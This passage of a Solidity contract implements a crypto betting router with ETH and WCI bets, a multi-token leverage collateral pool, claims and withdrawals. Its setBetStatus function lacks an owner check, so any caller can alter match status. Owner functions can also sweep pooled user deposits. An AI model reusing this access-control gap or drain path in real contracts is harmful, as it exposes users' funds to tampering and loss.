    mapping (uint256 => address) pairs; // All pair contract addresses
    uint256 matchId;
    address taxCollectorAddress = 0x41076e8DEbC1C51E0225CF73Cc23Ebd9D20424CE;        // Tax collector address
    uint256 totalClaimEth;
    uint256 totalClaimWci;
    uint256 totalWinnerCountEth;
    uint256 totalWinnerCountWci;

    IERC20 wciToken = IERC20(0xC5a9BC46A7dbe1c6dE493E84A18f02E70E2c5A32);
    IERC20USDT _usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);  // USDT token
    IERC20 _usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);          // USDC token
    IERC20 _shib = IERC20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);          // SHIB token
    IERC20 _doge = IERC20(0x4206931337dc273a630d328dA6441786BfaD668f);          // DOGE token

    LeveragePool _lpPool;

    constructor() {
        _lpPool = new LeveragePool();
    }

    /*
    * @Check if the input pair id is valid
    */
    modifier onlyValidPair(uint256 _id) {
        require(_id >= 0 && _id < matchId, "Invalid pair id.");
        _;
    }

    /*
    * @Check if the amount condition meets per token
    */
    modifier betConditions(uint _amount, IBettingPair.TOKENTYPE _token) {
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            require(_amount >= 0.01 ether, "Insuffisant amount, please increase your bet!");
        } else if (_token == IBettingPair.TOKENTYPE.WCI) {
            require(_amount >= 1000 gwei, "Insuffisant amount, please increase your bet!");
        }
        _;
    }

    /*
    * @Function to create one pair for a match
    */
    function createOne() public onlyOwner {
        BettingPair _pair = new BettingPair();
        pairs[matchId] = address(_pair);
        matchId ++;
    }

    /*
    * Function for betting with ethers.
    * This function should be separated from other betting function because this is payable function.
    */
    function betEther(uint256 _pairId, IBettingPair.CHOICE _choice, uint256 _multiplier) external payable
        onlyValidPair(_pairId)
        betConditions(msg.value, IBettingPair.TOKENTYPE.ETH)
    {
        uint256 ethInLPPool = _lpPool.getPlayerLPBalanceInEth(msg.sender);
        require(ethInLPPool >= (msg.value).mul(_multiplier.sub(1)), "You don't have enough collaterals for that multiplier.");

        uint256 ethCol;     // ETH collateral amount
        uint256 usdtCol;    // USDT collateral amount
        uint256 usdcCol;    // USDC collateral amount
        uint256 shibCol;    // SHIB collateral amount
        uint256 dogeCol;    // DOGE collateral amount

        (ethCol, usdtCol, usdcCol, shibCol, dogeCol) = _lpPool.calcLockTokenAmountsAsCollateral(msg.sender, (msg.value).mul(_multiplier.sub(1)));
        _lpPool.lock(msg.sender, ethCol, usdtCol, usdcCol, shibCol, dogeCol);
        _lpPool.unlock(owner(), ethCol, usdtCol, usdcCol, shibCol, dogeCol);

        IBettingPair(pairs[_pairId]).bet(msg.sender, msg.value, _multiplier, _choice, IBettingPair.TOKENTYPE.ETH,
            ethCol, usdtCol, usdcCol, shibCol, dogeCol);
    }

    /*
    * Function for betting with WCI.
    * This function should be separated from ETH and other tokens because this token's transferFrom function has default tax rate.
    */
    function betWCI(uint256 _pairId, uint256 _betAmount, IBettingPair.CHOICE _choice) external
        onlyValidPair(_pairId)
        betConditions(_betAmount, IBettingPair.TOKENTYPE.WCI)
    {
        wciToken.transferFrom(msg.sender, address(this), _betAmount);

        // Apply 5% tax to all bet amounts.
        IBettingPair(pairs[_pairId]).bet(msg.sender, _betAmount.mul(19).div(20), 1, _choice, IBettingPair.TOKENTYPE.WCI, 0, 0, 0, 0, 0);
    }

    /*
    * @Function to claim earnings.
    */
    function claim(uint256 _pairId, IBettingPair.TOKENTYPE _token) external onlyValidPair(_pairId) {
        uint256[] memory claimInfo = IBettingPair(pairs[_pairId]).claim(msg.sender, _token);
        uint256 _amountClaim = claimInfo[0];
        uint256 _amountTax = claimInfo[1];
        require(_amountClaim > 0, "You do not have any profit in this bet");

        if (_token == IBettingPair.TOKENTYPE.ETH) {
            payable(msg.sender).transfer(_amountClaim);
            payable(taxCollectorAddress).transfer(_amountTax);

            _lpPool.unlock(msg.sender, claimInfo[2], claimInfo[3], claimInfo[4], claimInfo[5], claimInfo[6]);
            _lpPool.lock(owner(), claimInfo[2], claimInfo[3], claimInfo[4], claimInfo[5], claimInfo[6]);
        } else if (_token == IBettingPair.TOKENTYPE.WCI) {
            wciToken.transfer(msg.sender, _amountClaim);
        }
        
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            totalClaimEth += _amountClaim;
            totalWinnerCountEth ++;
        } else {
            totalClaimWci += _amountClaim;
            totalWinnerCountWci ++;
        }
    }

    /*
    * @Function to withdraw tokens from router contract.
    */
    function withdrawPFromRouter(uint256 _amount, IBettingPair.TOKENTYPE _token) external doubleChecker {
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            payable(owner()).transfer(_amount);
        } else if (_token == IBettingPair.TOKENTYPE.WCI) {
            wciToken.transfer(owner(), _amount);
        }
    }

    /*
    * @Function to get player bet information with triple data per match(per player choice).
    * @There are 3 types of information - first part(1/3 of total) is player bet amount information.
        Second part(1/3 of total) is multiplier information. Third part(1/3 of total) is player earning information.
    * @These information were separated before but merged to one function because of capacity of contract.
    */
    function getBetTripleInformation(address _player, IBettingPair.TOKENTYPE _token) external view returns (uint256[] memory) {
        uint256[] memory res = new uint256[](matchId * 9);

        for (uint256 i=0; i<matchId; i++) {
            uint256[] memory oneAmount = IBettingPair(pairs[i]).getPlayerBetAmount(_player, _token);
            res[i*3] = oneAmount[0];
            res[i*3 + 1] = oneAmount[1];
            res[i*3 + 2] = oneAmount[2];

            uint256[] memory oneMultiplier = IBettingPair(pairs[i]).calcMultiplier(_token);
            res[matchId*3 + i*3] = oneMultiplier[0];
            res[matchId*3 + i*3 + 1] = oneMultiplier[1];
            res[matchId*3 + i*3 + 2] = oneMultiplier[2];

            uint256[] memory oneClaim = IBettingPair(pairs[i]).calcEarning(_player, _token);
            res[matchId*6 + i*3] = oneClaim[0];
            res[matchId*6 + i*3 + 1] = oneClaim[1];
            res[matchId*6 + i*3 + 2] = oneClaim[2];
        }
        
        return res;
    }

    /*
    * @Function to get player bet information with single data per match.
    */
    function getBetSingleInformation(address _player, IBettingPair.TOKENTYPE _token) external view returns (uint256[] memory) {
        uint256[] memory res = new uint256[](matchId * 4);

        for (uint256 i=0; i<matchId; i++) {
            res[i] = IBettingPair(pairs[i]).getPlayerClaimHistory(_player, _token);
            res[matchId + i] = uint256(IBettingPair(pairs[i]).getBetStatus());
            res[matchId*2 + i] = uint256(IBettingPair(pairs[i]).getBetResult());
            res[matchId*3 + i] = IBettingPair(pairs[i]).getTotalBet(_token);
        }

        return res;
    }

    /*
    * @Function to get the newly creating match id.
    */
    function getMatchId() external view returns (uint256) {
        return matchId;
    }

    /*
    * @Function to get tax collector address
    */
    function getTaxCollectorAddress() external view returns (address) {
        return taxCollectorAddress;
    }

    /*
    * @Function to get match status per token.
    * @This includes total claim amount and total winner count.
    */
    function getBetStatsData(IBettingPair.TOKENTYPE _token) external view returns (uint256, uint256) {
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            return (totalClaimEth, totalWinnerCountEth);
        } else {
            return (totalClaimWci, totalWinnerCountWci);
        }
    }

    /*
    * @Function to set bet status data.
    * @This function is needed because we upgraded the smart contract for several times and each time we upgrade
    *   the smart contract, we need to set these values so that they can continue to count.
    */
    function setBetStatsData(uint256 _totalClaim, uint256 _totalWinnerCount, IBettingPair.TOKENTYPE _token) external onlyOwner {
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            totalClaimEth = _totalClaim;
            totalWinnerCountEth = _totalWinnerCount;
        } else {
            totalClaimWci = _totalClaim;
            totalWinnerCountWci = _totalWinnerCount;
        }
    }

    /*
    * @Function to get WCI token threshold.
    * @Users tax rate(5% or 10%) will be controlled by this value.
    */
    // function getWciTokenThreshold() external view returns (uint256) {
    //     if (matchId == 0) return 50000 * 10**9;
    //     else return IBettingPair(pairs[0]).getWciTokenThreshold();
    // }

    /*
    * @Function to set bet result.
    */
    function setBetResult(uint256 _pairId, IBettingPair.CHOICE _result) external onlyOwner onlyValidPair(_pairId) {
        IBettingPair(pairs[_pairId]).setBetResult(_result);
    }

    /*
    * @Function to set bet status.
    */
    function setBetStatus(uint256 _pairId, IBettingPair.BETSTATUS _status) external onlyValidPair(_pairId) {
        IBettingPair(pairs[_pairId]).setBetStatus(_status);
    }

    /*
    * @Function to set tax collector address.
    */
    function setTaxCollectorAddress(address _address) external onlyOwner {
        taxCollectorAddress = _address;
    }

    /*
    * @Function to set WCI token threshold.
    */
    function setWciTokenThreshold(uint256 _threshold) external onlyOwner {
        for (uint256 i=0; i<matchId; i++) {
            IBettingPair(pairs[i]).setWciTokenThreshold(_threshold);
        }
    }

    /*
    * @Function to deposit ETH for collateral.
    */
    function depositEth() external payable {
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01");

        _lpPool.depositEth(msg.sender, msg.value);
    }

    /*
    * @Function to deposit tokens for collateral.
    */
    function depositErc20(IBettingPair.LPTOKENTYPE token, uint256 amount) external {
        if (token == IBettingPair.LPTOKENTYPE.USDT) {
            require(amount >= 15 * 10 ** 6, "Minimum deposit USDT amount is 15");
            _usdt.transferFrom(msg.sender, address(this), amount);
        }
        else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            require(amount >= 15 * 10 ** 6, "Minimum deposit USDC amount is 15");
            _usdc.transferFrom(msg.sender, address(this), amount);
        }
        else if (token == IBettingPair.LPTOKENTYPE.SHIB){
            require(amount >= 1500000 ether, "Minumum deposit SHIB amount is 1500000");
            _shib.transferFrom(msg.sender, address(this), amount);
        }
        else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            require(amount >= 180 * 10 ** 8, "Minimum deposit DOGE amount is 180");
            _doge.transferFrom(msg.sender, address(this), amount);
        }

        _lpPool.depositErc20(msg.sender, token, amount);
    }

    /*
    * @Function to withdraw tokens from leverage pool.
    */
    function withdraw(IBettingPair.LPTOKENTYPE token, uint256 amount) external {
        require(amount > 0, "Withdraw amount should be bigger than 0");

        uint256 ethAmount;
        uint256 usdtAmount;
        uint256 usdcAmount;
        uint256 shibAmount;
        uint256 dogeAmount;

        (ethAmount, usdtAmount, usdcAmount, shibAmount, dogeAmount) = _lpPool.getUserLPBalance(msg.sender);

        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            require(ethAmount >= amount, "Not enough ETH balance to withdraw");
            payable(msg.sender).transfer(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            require(usdtAmount >= amount, "Not enough USDT balance to withdraw");
            _usdt.transfer(msg.sender, amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            require(usdcAmount >= amount, "Not enough USDC balance to withdraw");
            _usdc.transfer(msg.sender, amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            require(shibAmount >= amount, "Not enough SHIB balance to withdraw");
            _shib.transfer(msg.sender, amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            require(dogeAmount >= amount, "Not enough DOGE balance to withdraw");
            _doge.transfer(msg.sender, amount);
        }

        _lpPool.withdraw(msg.sender, token, amount);
    }

    /*
    * @Function to get player's LP token balance.
    */
    function getUserLPBalance(address player) external view returns (uint256, uint256, uint256, uint256, uint256) {
        return _lpPool.getUserLPBalance(player);
    }

    /*
    * @Function to withdraw LP token from contract on owner side.
    */
    function withdrawLPFromContract(IBettingPair.LPTOKENTYPE token, uint256 amount) public doubleChecker {
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            payable(owner()).transfer(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdt.transfer(owner(), amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdc.transfer(owner(), amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shib.transfer(owner(), amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _doge.transfer(owner(), amount);
        }

        _lpPool.withdrawFromContract(owner(), token, amount);
    }
}